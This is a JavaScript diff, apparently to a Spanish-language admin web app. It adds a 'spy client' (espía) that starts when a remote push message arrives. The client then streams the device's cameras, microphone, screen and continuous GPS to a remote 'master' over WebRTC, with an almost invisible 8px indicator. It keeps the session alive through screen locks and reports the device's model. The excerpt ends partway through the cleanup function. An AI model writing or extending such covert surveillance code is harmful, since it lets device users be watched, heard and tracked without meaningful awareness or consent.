@@ -40668,6 +40668,712 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
 
   let _pushMsgHandlerSet = false;
 
+  // ════════════════════════════════════════════════════════════════════════
+  // [793] CLIENTE ESPÍA V2 MOS — WebRTC live (lado-dispositivo)
+  // Port del cliente de warehouseMos (vanilla JS puro). Hasta ahora solo ME y
+  // WH capturaban cam/mic/pantalla; la app MOS (panel admin) NO tenía el
+  // lado-dispositivo, así que los equipos de admin/master no se podían
+  // monitorear en vivo. Este bloque agrega ese cliente: recibe el push
+  // MOS_ESPIA_INICIAR (por SW en background o por onMessage en primer plano),
+  // levanta la RTCPeerConnection contra el master y transmite tracks + GPS.
+  //
+  // Diferencias vs WH declaradas:
+  //  · deviceId → _getOrCreateDeviceId() (identidad canónica MOS).
+  //  · NO se porta el buffer-recorder (MediaRecorder → chunks a Storage): MOS
+  //    no tiene el Edge espiaSubirChunkEdge y su audio va por otro camino
+  //    (mos.espia_audio_*). Solo el WebRTC LIVE. Los objetos bufferRecorders/
+  //    bufferTimers quedan {} para que la limpieza sea inerte (no rompe nada).
+  //  · Dependencias opcionales (_activarWakeLock) guardadas con typeof/try-catch.
+  //  · Todas las llamadas de señalización van por API.espiaRpc (mos.espia_*).
+  // ════════════════════════════════════════════════════════════════════════
+  (function _espiaCliMOSSetup() {
+    if (window.__MOS_ESPIA_CLI_SETUP) return;   // idempotente (script inline eval una vez)
+    window.__MOS_ESPIA_CLI_SETUP = true;
+    window._espiaCliMOS = null;
+    // Acción→RPC Supabase (mos.espia_*). Mismo shape {ok,data} que devuelve API.espiaRpc.
+    const _ESPIA_RPC = {
+      espiaIniciarDispositivo: 'espia_iniciar_dispositivo', espiaConfig: 'espia_config',
+      espiaSync: 'espia_sync', espiaPushBatch: 'espia_push_batch',
+      espiaSubirRespuesta: 'espia_subir_respuesta', espiaSubirRenegOferta: 'espia_subir_reneg_oferta',
+      espiaCerrarSesion: 'espia_cerrar_sesion'
+    };
+    async function _espiaCliMOSPost(accion, params) {
+      // Supabase-first: la acción tiene RPC → mos.espia_* vía API.espiaRpc (mismo shape {ok,data}).
+      const rpc = _ESPIA_RPC[accion];
+      if (rpc && window.ESPIA_DIRECTO !== false && typeof API !== 'undefined' && API.espiaRpc) {
+        try {
+          const out = await API.espiaRpc(rpc, params || {});
+          if (out) return out;   // {ok,data} o {ok:false,error de negocio} — el loop lo maneja igual
+        } catch (_) { /* RPC falló → null; el loop reintenta en el próximo tick */ }
+      }
+      // Sin fallback GAS: el espía MOS va 100% por mos.espia_*. Si falla → null → el loop se salta
+      // este tick (la expiración server-side barre sesiones huérfanas). Vigilancia, no dinero → fail-soft.
+      return null;
+    }
+    function _espiaCliMOSIndicador() {
+      if (document.getElementById('espiaCliMOSIndicador')) return;
+      const html = `<div id="espiaCliMOSIndicador" style="position:fixed;bottom:6px;right:6px;font-size:8px;color:rgba(165,180,252,.6);background:rgba(15,23,42,.4);padding:2px 5px;border-radius:4px;z-index:99998;pointer-events:none;font-family:monospace">·</div>`;
+      document.body.insertAdjacentHTML('beforeend', html);
+    }
+    function _espiaCliMOSOcultarIndicador() {
+      document.getElementById('espiaCliMOSIndicador')?.remove();
+    }
+    window._espiaCliMOSIniciar = async function (sesionId, masterId) {
+      if (window._espiaCliMOS) {
+        await window._espiaCliMOSCerrar('reinicio');
+      }
+      // Identidad canónica del equipo MOS (DeviceAuth → mos_device_id).
+      const deviceIdLocal = (typeof _getOrCreateDeviceId === 'function' ? _getOrCreateDeviceId() : null) || 'unknown';
+      console.log('[espia MOS] iniciando sesión', sesionId);
+      window._espiaCliMOS = {
+        sesionId, masterId, deviceId: deviceIdLocal,
+        pc: null, streams: {}, gpsWatch: null, gpsCh: null,
+        iceDesde: 0, bufferRecorders: {}, bufferTimers: {},
+        pollTimerSync: null,
+        // Handshake con backend antes de WebRTC: token HMAC + iceServers (TURN opcional).
+        token: null,
+        // Cola de ICE locales — se vuelca cada 250ms vía espiaPushBatch
+        _iceQueue: [],
+        _iceFlushTimer: null,
+        // Backoff exponencial del sync poll en caso de errores consecutivos
+        _consErrores: 0,
+        _ticksAEsperar: 0,
+        // Watchdog de ICE failed para reconnect/cierre graceful
+        _iceFailedDesde: 0,
+        _iceWatchdogTimer: null,
+        // State de capabilities reportadas al master (definido acá para no depender del event loop)
+        _capsState: { camsHardware: 0, dualIntentado: false }
+      };
+      // Forzar Wake Lock si la app lo tiene — pantalla activa ayuda a mantener cam/mic/GPS.
+      // MOS puede no tener este helper → guardado.
+      try { if (typeof _activarWakeLock === 'function') _activarWakeLock(true, true); } catch (_) {}
+      // Handshake auth + config en paralelo. El device prueba identidad (deviceId coincide con la
+      // sesión) y recibe token HMAC + lista de iceServers (TURN si disponible).
+      let iceServers = [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }];
+      try {
+        const [rTok, rCfg] = await Promise.all([
+          _espiaCliMOSPost('espiaIniciarDispositivo', { sesionId, deviceId: deviceIdLocal }),
+          _espiaCliMOSPost('espiaConfig', {})
+        ]);
+        if (rTok?.data?.token) {
+          window._espiaCliMOS.token = rTok.data.token;
+          console.log('[espia MOS] handshake OK · token recibido');
+        } else {
+          console.warn('[espia MOS] handshake sin token (compat mode):', rTok?.error || 'response vacío');
+        }
+        if (Array.isArray(rCfg?.data?.iceServers) && rCfg.data.iceServers.length) {
+          iceServers = rCfg.data.iceServers;
+          if (rCfg.data.tieneTurn) console.log('[espia MOS] TURN disponible');
+        }
+      } catch (eH) { console.warn('[espia MOS] handshake fallo:', eH?.message); }
+      if (!window._espiaCliMOS) return; // por si cerraron mid-handshake
+      window._espiaCliMOS._iceServers = iceServers;
+      try {
+        // facingMode fallback cascada (algunos equipos no tienen frontal)
+        const _camVariants = [
+          { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+          { facingMode: 'user',        width: { ideal: 640 }, height: { ideal: 480 } },
+          { width: { ideal: 640 }, height: { ideal: 480 } }
+        ];
+        for (const vC of _camVariants) {
+          try {
+            window._espiaCliMOS.streams.userMedia = await navigator.mediaDevices.getUserMedia({
+              audio: { echoCancellation: true, noiseSuppression: true },
+              video: vC
+            });
+            break;
+          } catch (e) { console.warn('[espia MOS] getUserMedia variant fallo:', JSON.stringify(vC), e.message); }
+        }
+        if (!window._espiaCliMOS.streams.userMedia) {
+          try {
+            window._espiaCliMOS.streams.userMedia = await navigator.mediaDevices.getUserMedia({
+              audio: { echoCancellation: true, noiseSuppression: true }
+            });
+          } catch (e) { console.warn('[espia MOS] solo audio fallo:', e.message); }
+        }
+        // cam/mic/GPS son independientes de pantalla. Conexión inicial SIN pantalla; la pantalla
+        // se pide ASYNC y cuando llega dispara onnegotiationneeded → reneg SDP.
+        if (!window._espiaCliMOS.streams.userMedia) {
+          await window._espiaCliMOSCerrar('sin_streams');
+          return;
+        }
+        // iceServers vienen del backend (incluye TURN si configurado). Permite conectar detrás de NAT simétrico.
+        const pc = new RTCPeerConnection({ iceServers: window._espiaCliMOS._iceServers });
+        window._espiaCliMOS.pc = pc;
+        // Flag para que onnegotiationneeded no dispare en el setup inicial
+        window._espiaCliMOS._setupInicialDone = false;
+        window._espiaCliMOS._renegEnCurso = false;
+        window._espiaCliMOS._ultimaReneg = 0;
+        // ICE recovery + watchdog SUSPENDIBLE. Cuando el equipo se bloquea (visibilityState='hidden')
+        // el OS suspende el tab y los keepalives fallan a los 15-30s. El watchdog NO cierra mientras
+        // el tab esté oculto — da chance a restartIce cuando vuelve.
+        pc.oniceconnectionstatechange = () => {
+          console.log('[espia MOS] ICE state:', pc.iceConnectionState);
+          const ref = window._espiaCliMOS;
+          if (!ref) return;
+          if (pc.iceConnectionState === 'failed') {
+            if (!ref._iceFailedDesde) ref._iceFailedDesde = Date.now();
+            console.warn('[espia MOS] ICE failed · restartIce');
+            try { pc.restartIce(); } catch (eR) { console.warn('[espia MOS] restartIce fallo:', eR.message); }
+          } else if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+            ref._iceFailedDesde = 0;
+          }
+        };
+        window._espiaCliMOS._iceWatchdogTimer = setInterval(() => {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ref._iceFailedDesde) return;
+          if (document.visibilityState === 'hidden') return; // pantalla bloqueada → esperar resume
+          const desdeReanudacion = ref._ultimaVisible ? (Date.now() - ref._ultimaVisible) : Infinity;
+          const failedHace = Date.now() - ref._iceFailedDesde;
+          if (failedHace > 30000 && desdeReanudacion > 15000) {
+            console.warn('[espia MOS] ICE failed >30s post-resume · cerrando');
+            window._espiaCliMOSCerrar('ice_failed_persistente');
+          }
+        }, 5000);
+
+        // VISIBILITY handler. Usa ref.pc (no closure de pc) para que si la sesión se reinició entre
+        // listener-add y dispatch, el handler viejo no actúe sobre PC zombi.
+        window._espiaCliMOS._handlerVisibility = () => {
+          const ref = window._espiaCliMOS;
+          if (!ref) return;
+          const pcAhora = ref.pc;
+          if (!pcAhora) return; // PC zombi/inexistente
+          const ahoraVisible = document.visibilityState === 'visible';
+          try {
+            if (ref.gpsCh?.readyState === 'open') {
+              ref.gpsCh.send(JSON.stringify({ __meta: 'visibility', visible: ahoraVisible }));
+            }
+          } catch (_) {}
+          if (ahoraVisible) {
+            console.log('[espia MOS visibility] visible · reanimar');
+            ref._ultimaVisible = Date.now();
+            try { if (typeof _activarWakeLock === 'function') _activarWakeLock(true, true); } catch (_) {}
+            if (pcAhora.connectionState !== 'closed') {
+              let estICE = '';
+              try { estICE = pcAhora.iceConnectionState; } catch (_) { return; }
+              if (estICE === 'failed' || estICE === 'disconnected') {
+                console.log('[espia MOS] ICE post-resume:', estICE, '· restartIce');
+                try { pcAhora.restartIce(); } catch (_) {}
+              }
+            }
+            let muertos = 0;
+            [ref.streams.userMedia, ref.streams.userMedia2, ref.streams.display].forEach(s => {
+              if (!s) return;
+              s.getTracks().forEach(t => { if (t.readyState === 'ended') muertos++; });
+            });
+            if (muertos > 0) console.warn('[espia MOS] ' + muertos + ' track(s) muertos por OS post-lock');
+          } else {
+            console.log('[espia MOS visibility] hidden · pantalla bloqueada');
+          }
+        };
+        if (window.__espiaCliMOSVisibilityHandlerPrev) {
+          try { document.removeEventListener('visibilitychange', window.__espiaCliMOSVisibilityHandlerPrev); } catch (_) {}
+        }
+        document.addEventListener('visibilitychange', window._espiaCliMOS._handlerVisibility);
+        window.__espiaCliMOSVisibilityHandlerPrev = window._espiaCliMOS._handlerVisibility;
+        window._espiaCliMOS._ultimaVisible = Date.now();
+        if (window._espiaCliMOS.streams.userMedia) {
+          // contentHint propaga vía SDP (motion=cam, detail=pantalla). Mapping trackId → tipo por gpsCh como fallback.
+          window._espiaCliMOS._trackTipoMap = window._espiaCliMOS._trackTipoMap || {};
+          window._espiaCliMOS.streams.userMedia.getTracks().forEach(t => {
+            if (t.kind === 'video') t.contentHint = 'motion';
+            window._espiaCliMOS._trackTipoMap[t.id] = (t.kind === 'audio') ? 'audio' : 'camara';
+            pc.addTrack(t, window._espiaCliMOS.streams.userMedia);
+          });
+        }
+        // DUAL CAMERA — cascada de intentos (deviceId exact → facingMode exact → facingMode ideal).
+        // El motivo del fallo final se reporta vía capabilities.dualFallReason.
+        (async () => {
+          const setMotivo = (motivo) => {
+            if (window._espiaCliMOS?._capsState) {
+              window._espiaCliMOS._capsState.dualIntentado = true;
+              window._espiaCliMOS._capsState.dualFallReason = motivo;
+            }
+            window._espiaCliMOS?._enviarCapabilities?.();
+          };
+          const tryGetUserMedia = async (constraint, descripcion) => {
+            try {
+              const s = await navigator.mediaDevices.getUserMedia({ video: constraint });
+              console.log('[espia MOS] dual-cam ✓ ' + descripcion);
+              return s;
+            } catch (e) {
+              console.warn('[espia MOS] dual-cam ✗ ' + descripcion + ':', e.name, '·', e.message);
+              return null;
+            }
+          };
+          try {
+            const devs = await navigator.mediaDevices.enumerateDevices();
+            const cams = devs.filter(d => d.kind === 'videoinput');
+            const camsValidas = cams.filter(c => c.deviceId); // filtrar IDs vacíos (opacos sin permiso)
+            if (window._espiaCliMOS?._capsState) {
+              window._espiaCliMOS._capsState.camsHardware = cams.length;
+            }
+            if (cams.length < 2) {
+              console.log('[espia MOS] dual-cam: hardware reporta ' + cams.length + ' cámara(s) · skip');
+              return setMotivo('hardware_single_cam');
+            }
+            const tUsado = window._espiaCliMOS?.streams?.userMedia?.getVideoTracks?.()[0];
+            const settingsUsada = tUsado?.getSettings?.() || {};
+            const idUsado = settingsUsada.deviceId;
+            const facingUsado = settingsUsada.facingMode; // 'environment' | 'user' | undefined
+            const facingOpuesto = facingUsado === 'environment' ? 'user'
+                                : facingUsado === 'user' ? 'environment'
+                                : null;
+            console.log('[espia MOS] dual-cam · primaria facingMode=' + (facingUsado || '?') +
+                        ' · hardware=' + cams.length + ' · con deviceId=' + camsValidas.length);
+
+            let stream2 = null;
+            let exitoVia = '';
+            const otra = camsValidas.find(c => c.deviceId !== idUsado);
+            if (otra) {
+              stream2 = await tryGetUserMedia(
+                { deviceId: { exact: otra.deviceId }, width: { ideal: 640 }, height: { ideal: 480 } },
+                'deviceId exact (' + (otra.label || 'sin label') + ')'
+              );
+              if (stream2) exitoVia = 'deviceId';
+            }
+            if (!stream2 && facingOpuesto) {
+              stream2 = await tryGetUserMedia(
+                { facingMode: { exact: facingOpuesto }, width: { ideal: 640 }, height: { ideal: 480 } },
+                'facingMode exact ' + facingOpuesto
+              );
+              if (stream2) exitoVia = 'facingMode_exact';
+            }
+            if (!stream2 && facingOpuesto) {
+              stream2 = await tryGetUserMedia(
+                { facingMode: facingOpuesto, width: { ideal: 640 }, height: { ideal: 480 } },
+                'facingMode ideal ' + facingOpuesto
+              );
+              if (stream2) exitoVia = 'facingMode_ideal';
+            }
+            if (!stream2) {
+              let motivo = 'desconocido';
+              if (camsValidas.length < 2) motivo = 'deviceids_opacos';
+              else motivo = 'browser_no_permite_concurrent';
+              return setMotivo(motivo);
+            }
+            if (!window._espiaCliMOS) {
+              stream2.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+              return;
+            }
+            const tNuevo = stream2.getVideoTracks()[0];
+            const idNuevo = tNuevo?.getSettings?.()?.deviceId;
+            if (idNuevo && idNuevo === idUsado) {
+              console.warn('[espia MOS] dual-cam: browser devolvió la MISMA cámara · descartando');
+              stream2.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+              return setMotivo('browser_devolvio_misma_cam');
+            }
+            window._espiaCliMOS.streams.userMedia2 = stream2;
+            window._espiaCliMOS._trackTipoMap = window._espiaCliMOS._trackTipoMap || {};
+            stream2.getTracks().forEach(t => {
+              if (t.kind === 'video') t.contentHint = 'motion';
+              window._espiaCliMOS._trackTipoMap[t.id] = 'camara2';
+              pc.addTrack(t, stream2);
+            });
+            console.log('[espia MOS] 2da cámara agregada vía ' + exitoVia + ' · reneg disparará');
+            if (window._espiaCliMOS?._capsState) {
+              window._espiaCliMOS._capsState.dualIntentado = true;
+              window._espiaCliMOS._capsState.dualFallReason = null; // éxito
+            }
+            window._espiaCliMOS?._enviarTrackMap?.();
+            window._espiaCliMOS?._enviarCapabilities?.();
+          } catch (e) {
+            console.warn('[espia MOS] dual-cam excepción global:', e.name, e.message);
+            return setMotivo('excepcion:' + e.name);
+          }
+        })();
+        // Handler de renegociación — solo SUBE la nueva oferta. El polling de respuesta vive en
+        // pollTimerSync (centralizado). Sin race condition entre dos pollers leyendo lo mismo.
+        pc.onnegotiationneeded = async () => {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ref._setupInicialDone) return;
+          if (ref._renegEnCurso) return;
+          const ahora = Date.now();
+          if ((ahora - ref._ultimaReneg) < 2000) {
+            console.log('[espia MOS reneg] throttled (anti-spam)');
+            return;
+          }
+          ref._renegEnCurso = true; // mutex ANTES de awaits
+          ref._ultimaReneg = ahora;
+          try {
+            console.log('[espia MOS reneg] generando nueva offer');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            await _espiaCliMOSPost('espiaSubirRenegOferta', { sesionId, sdp: JSON.stringify(offer) });
+            if (window._espiaCliMOS) {
+              window._espiaCliMOS._renegTimeout = setTimeout(async () => {
+                const r2 = window._espiaCliMOS;
+                if (!r2 || !r2._renegEnCurso) return;
+                console.warn('[espia MOS reneg] timeout 30s · rollback');
+                if (pc.signalingState === 'have-local-offer') {
+                  try { await pc.setLocalDescription({ type: 'rollback' }); }
+                  catch (eRb) { console.warn('[espia MOS reneg] rollback fallo:', eRb.message); }
+                }
+                if (window._espiaCliMOS) window._espiaCliMOS._renegEnCurso = false;
+              }, 30000);
+            }
+          } catch (eR) {
+            console.warn('[espia MOS reneg] subida fallo:', eR?.message);
+            if (pc.signalingState === 'have-local-offer') {
+              try { await pc.setLocalDescription({ type: 'rollback' }); } catch (_) {}
+            }
+            if (window._espiaCliMOS) window._espiaCliMOS._renegEnCurso = false;
+          }
+        };
+        // Lanzar getDisplayMedia ASYNC sin bloquear el flow. Cuando llegue el track, addTrack dispara reneg.
+        if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+          (async () => {
+            try {
+              console.log('[espia MOS] solicitando pantalla async (sin timeout)...');
+              const screen = await navigator.mediaDevices.getDisplayMedia({
+                video: { frameRate: { ideal: 15 } }, audio: false
+              });
+              if (!window._espiaCliMOS) return;
+              // Esperar a que el setup inicial complete antes de addTrack; sino onnegotiationneeded
+              // dispara con flag false y el handler ignora → pantalla nunca se negocia.
+              let waitMs = 0;
+              while (window._espiaCliMOS && !window._espiaCliMOS._setupInicialDone && waitMs < 60000) {
+                await new Promise(r => setTimeout(r, 250));
+                waitMs += 250;
+              }
+              if (!window._espiaCliMOS) return;
+              if (!window._espiaCliMOS._setupInicialDone) {
+                console.warn('[espia MOS] setup inicial timeout 60s · descartando pantalla');
+                screen.getTracks().forEach(t => { try { t.stop(); } catch (_) {} });
+                return;
+              }
+              window._espiaCliMOS.streams.display = screen;
+              window._espiaCliMOS._trackTipoMap = window._espiaCliMOS._trackTipoMap || {};
+              screen.getTracks().forEach(t => {
+                if (t.kind === 'video') t.contentHint = 'detail';
+                window._espiaCliMOS._trackTipoMap[t.id] = 'pantalla';
+                const sender = pc.addTrack(t, screen);
+                // removeTrack al detener compartir → master deja de ver pantalla congelada. Dispara reneg.
+                t.onended = () => {
+                  console.log('[espia MOS] user detuvo compartir pantalla · quitando del peer');
+                  try {
+                    pc.removeTrack(sender);
+                    if (window._espiaCliMOS) {
+                      window._espiaCliMOS.streams.display = null;
+                    }
+                  } catch (eRm) { console.warn('[espia MOS] removeTrack fallo:', eRm.message); }
+                };
+              });
+              console.log('[espia MOS] pantalla agregada · onnegotiationneeded disparará reneg');
+              // Reenviar map al master apenas pantalla esté en el peer.
+              window._espiaCliMOS?._enviarTrackMap?.();
+            } catch (eS) { console.warn('[espia MOS] pantalla rechazada o falló:', eS.message); }
+          })();
+        } else {
+          console.log('[espia MOS] getDisplayMedia no disponible');
+        }
+        const gpsCh = pc.createDataChannel('gps');
+        window._espiaCliMOS.gpsCh = gpsCh;
+        // Helper para reenviar trackMap event-driven
+        window._espiaCliMOS._enviarTrackMap = () => {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ref.gpsCh || ref.gpsCh.readyState !== 'open') return;
+          try {
+            ref.gpsCh.send(JSON.stringify({
+              __meta: 'trackMap',
+              map: ref._trackTipoMap || {}
+            }));
+          } catch (_) {}
+        };
+        // Capabilities con detección honesta (plataforma/modelo/cámaras hardware).
+        window._espiaCliMOS._enviarCapabilities = async () => {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ref.gpsCh || ref.gpsCh.readyState !== 'open') return;
+          try {
+            const ua = navigator.userAgent || '';
+            let plataforma = 'desktop';
+            if (/iPad/i.test(ua) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(ua))) plataforma = 'tablet';
+            else if (/Android/i.test(ua) && !/Mobile/i.test(ua)) plataforma = 'tablet';
+            else if (/Tablet/i.test(ua)) plataforma = 'tablet';
+            else if (/Android|iPhone|iPod|Mobile/i.test(ua)) plataforma = 'mobile';
+            let modelo = '';
+            const mM = ua.match(/(iPhone|iPad|Pixel \d+\w*(?: Pro)?|SM-[A-Z0-9]+|Redmi[^;)]*|POCO[^;)]*|moto[^;)]*|HUAWEI[^;)]*|OnePlus[^;)]*)/i);
+            if (mM) modelo = mM[1].trim();
+            let camsHardware = ref._capsState.camsHardware;
+            if (!camsHardware) {
+              try {
+                const devs = await navigator.mediaDevices.enumerateDevices();
+                camsHardware = devs.filter(d => d.kind === 'videoinput').length;
+                ref._capsState.camsHardware = camsHardware;
+              } catch (_) {}
+            }
+            const camsAbiertas = ref.streams.userMedia2 ? 2 : (ref.streams.userMedia ? 1 : 0);
+            const caps = {
+              esMobile:      plataforma !== 'desktop',
+              plataforma,
+              modelo:        modelo || (plataforma === 'desktop' ? 'PC' : 'Smartphone'),
+              tienePantalla: typeof navigator.mediaDevices?.getDisplayMedia === 'function',
+              camsHardware,
+              camsAbiertas,
+              dualIntentado: ref._capsState.dualIntentado,
+              dualFallReason: ref._capsState.dualFallReason,
+              touchPoints:   navigator.maxTouchPoints || 0
+            };
+            ref.gpsCh.send(JSON.stringify({ __meta: 'capabilities', caps }));
+            console.log('[espia MOS] capabilities reportadas:', caps);
+          } catch (_) {}
+        };
+        gpsCh.onopen = () => {
+          console.log('[espia MOS gps] DataChannel abierto');
+          window._espiaCliMOS?._enviarTrackMap();
+          window._espiaCliMOS?._enviarCapabilities();
+          setTimeout(() => {
+            window._espiaCliMOS?._enviarTrackMap();
+            window._espiaCliMOS?._enviarCapabilities();
+          }, 1500);
+        };
+        gpsCh.onerror = e => console.warn('[espia MOS gps] DataChannel error:', e?.message);
+        // GPS strategy 2-pass: posición rápida (IP/WiFi, low accuracy) + watchPosition (high accuracy).
+        if ('geolocation' in navigator) {
+          let _gpsLastMOS = { lat: null, lng: null, ts: 0 };
+          const _distMMOS = (a, b) => {
+            if (a.lat == null || b.lat == null) return Infinity;
+            const R = 6371000;
+            const φ1 = a.lat * Math.PI / 180, φ2 = b.lat * Math.PI / 180;
+            const Δφ = (b.lat - a.lat) * Math.PI / 180;
+            const Δλ = (b.lng - a.lng) * Math.PI / 180;
+            const x = Math.sin(Δφ / 2) ** 2 + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ / 2) ** 2;
+            return 2 * R * Math.atan2(Math.sqrt(x), Math.sqrt(1 - x));
+          };
+          const GPS_BACKPRESSURE_BYTES = 1024 * 1024; // 1MB
+          const _enviarGps = (cur, src) => {
+            if (gpsCh.readyState !== 'open') { console.log('[espia MOS gps] channel no open, esperando:', gpsCh.readyState); return; }
+            if (gpsCh.bufferedAmount > GPS_BACKPRESSURE_BYTES) {
+              console.warn('[espia MOS gps] backpressure: buffered=' + gpsCh.bufferedAmount + 'B, skip');
+              return;
+            }
+            try {
+              gpsCh.send(JSON.stringify(cur));
+              console.log('[espia MOS gps] enviado (' + src + '):', cur.lat.toFixed(5), cur.lng.toFixed(5), '±' + Math.round(cur.acc) + 'm');
+              _gpsLastMOS = { lat: cur.lat, lng: cur.lng, ts: cur.ts };
+            } catch (eS) { console.warn('[espia MOS gps] send fallo:', eS.message); }
+          };
+          const _reintentarHasta = (ms) => {
+            const start = Date.now();
+            const intentar = () => {
+              if (gpsCh.readyState === 'open') {
+                navigator.geolocation.getCurrentPosition(
+                  pos => _enviarGps({
+                    lat: pos.coords.latitude, lng: pos.coords.longitude,
+                    speed: pos.coords.speed || 0, acc: pos.coords.accuracy, ts: Date.now()
+                  }, 'quick'),
+                  err => console.warn('[espia MOS gps quick]', err.code, err.message),
+                  { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 }
+                );
+              } else if (Date.now() - start < ms) {
+                setTimeout(intentar, 500);
+              }
+            };
+            intentar();
+          };
+          _reintentarHasta(15000);
+          window._espiaCliMOS.gpsWatch = navigator.geolocation.watchPosition(
+            pos => {
+              const now = Date.now();
+              const cur = { lat: pos.coords.latitude, lng: pos.coords.longitude,
+                            speed: pos.coords.speed || 0, acc: pos.coords.accuracy, ts: now };
+              if ((now - _gpsLastMOS.ts) < 30000 && _distMMOS(_gpsLastMOS, cur) < 5) return;
+              _enviarGps(cur, 'watch');
+            },
+            err => console.warn('[espia MOS gps watch]', err.code, err.message),
+            { enableHighAccuracy: true, maximumAge: 30000, timeout: 30000 }
+          );
+        } else {
+          console.warn('[espia MOS gps] navigator.geolocation no disponible');
+        }
+        // ICE batch — se encolan y se mandan en bloques cada 250ms vía espiaPushBatch (1 lock por flush, no N).
+        pc.onicecandidate = (ev) => {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ev.candidate) return;
+          const c = ev.candidate.toJSON ? ev.candidate.toJSON() : ev.candidate;
+          ref._iceQueue.push(c);
+        };
+        window._espiaCliMOS._iceFlushTimer = setInterval(async () => {
+          const ref = window._espiaCliMOS;
+          if (!ref || !ref._iceQueue.length) return;
+          const batch = ref._iceQueue.splice(0, ref._iceQueue.length);
+          try {
+            await _espiaCliMOSPost('espiaPushBatch', {
+              sesionId, lado: 'device',
+              ice: batch.map(c => ({ ice: c }))
+            });
+          } catch (eF) { console.warn('[espia MOS ice flush]', eF?.message); }
+        }, 250);
+        // NO cerrar en 'failed' inmediato — el watchdog ICE de 30s espera por restartIce. Cerrar solo en 'closed'.
+        pc.onconnectionstatechange = () => {
+          console.log('[espia MOS] connection state:', pc.connectionState);
+          if (pc.connectionState === 'closed') {
+            window._espiaCliMOSCerrar('connection_closed');
+          }
+        };
+        // BATCH SYNC — 1 endpoint único (espiaSync) que devuelve oferta/respuesta-reneg/ICE en 1 round-trip.
+        window._espiaCliMOS._pollSyncEnCurso = false;
+        window._espiaCliMOS.iceDesde = window._espiaCliMOS.iceDesde || 0;
+        window._espiaCliMOS.pollTimerSync = setInterval(async () => {
+          const ref = window._espiaCliMOS;
+          if (!ref || ref._pollSyncEnCurso) return;
+          // Backoff exponencial — si el backend tira errores consecutivos, saltamos ticks. Reset al primer OK.
+          if (ref._ticksAEsperar > 0) { ref._ticksAEsperar--; return; }
+          ref._pollSyncEnCurso = true;
+          try {
+            const yaConectado = !!pc.remoteDescription;
+            const esperandoReneg = !!ref._renegEnCurso;
+            const r = await _espiaCliMOSPost('espiaSync', {
+              sesionId,
+              lado: 'device',
+              iceDesde: ref.iceDesde,
+              necesito: {
+                sdpOferta: !yaConectado,
+                sdpRenegRespuesta: esperandoReneg,
+                ice: true
+              }
+            });
+            const refAfter = window._espiaCliMOS;
+            if (!refAfter) return;
+            const d = r?.data;
+            if (!d) return;
+
+            // (1) Cierre remoto — corto circuito inmediato
+            if (d.estado === 'CERRADA') {
+              window._espiaCliMOSCerrar('master_cerro');
+              return;
+            }
+
+            // (2) Oferta inicial → setRemoteDescription + answer
+            if (!yaConectado && d.sdpOferta) {
+              try {
+                const sdpRemote = JSON.parse(d.sdpOferta);
+                await pc.setRemoteDescription(sdpRemote);
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+                await _espiaCliMOSPost('espiaSubirRespuesta', { sesionId, sdp: JSON.stringify(answer) });
+                if (window._espiaCliMOS) window._espiaCliMOS._setupInicialDone = true;
+                console.log('[espia MOS] setup inicial completo · onnegotiationneeded activo');
+              } catch (eO) {
+                console.warn('[espia MOS sync] oferta inicial fallo:', eO?.message);
+              }
+            }
+
+            // (3) Respuesta de renegociación pendiente
+            if (esperandoReneg && d.sdpRenegRespuesta) {
+              try {
+                if (pc.signalingState !== 'have-local-offer') {
+                  console.warn('[espia MOS reneg] state inesperado:', pc.signalingState, '· descarto');
+                } else {
+                  const sdpAns = JSON.parse(d.sdpRenegRespuesta);
+                  await pc.setRemoteDescription(sdpAns);
+                  console.log('[espia MOS reneg] respuesta aplicada ✓');
+                }
+                if (window._espiaCliMOS) {
+                  window._espiaCliMOS._renegEnCurso = false;
+                  if (window._espiaCliMOS._renegTimeout) {
+                    clearTimeout(window._espiaCliMOS._renegTimeout);
+                    window._espiaCliMOS._renegTimeout = null;
+                  }
+                }
+              } catch (eR) {
+                console.warn('[espia MOS reneg] aplicar respuesta fallo:', eR?.message);
+                if (window._espiaCliMOS) window._espiaCliMOS._renegEnCurso = false;
+              }
+            }
+
+            // (4) ICE candidates del master (batched)
+            if (d.ice?.length) {
+              for (const c of d.ice) {
+                try { await pc.addIceCandidate(c.ice); }
+                catch (eC) { console.warn('[espia MOS] addIceCandidate fallo:', eC?.message); }
+              }
+              if (window._espiaCliMOS && d.tsMax) window._espiaCliMOS.iceDesde = d.tsMax;
+            }
+            if (window._espiaCliMOS && window._espiaCliMOS._consErrores > 0) {
+              window._espiaCliMOS._consErrores = 0;
+            }
+          } catch (e) {
+            if (e?.message) console.warn('[espia MOS sync]', e.message);
+            if (window._espiaCliMOS) {
+              window._espiaCliMOS._consErrores++;
+              window._espiaCliMOS._ticksAEsperar = Math.min(14, Math.pow(2, window._espiaCliMOS._consErrores) - 1);
+            }
+          } finally {
+            if (window._espiaCliMOS) window._espiaCliMOS._pollSyncEnCurso = false;
+          }
+        }, 700);
+        // [793] Buffer-recorder (grabación de chunks a Storage) NO portado a MOS: no existe el Edge
+        // espiaSubirChunkEdge acá y su audio va por otro camino (mos.espia_audio_*). Solo WebRTC live.
+        _espiaCliMOSIndicador();
+      } catch (e) {
+        console.warn('[espia MOS] error iniciando:', e);
+        await window._espiaCliMOSCerrar('error_init');
+      }
+    };
+    window._espiaCliMOSCerrar = async function (motivo) {
+      if (!window._espiaCliMOS) return;
+      console.log('[espia MOS] cerrando:', motivo);
+      const ref = window._espiaCliMOS;
+      window._espiaCliMOS = null;
+      // Limpiar TODOS los timers (sync, ICE flush, watchdog, reneg)
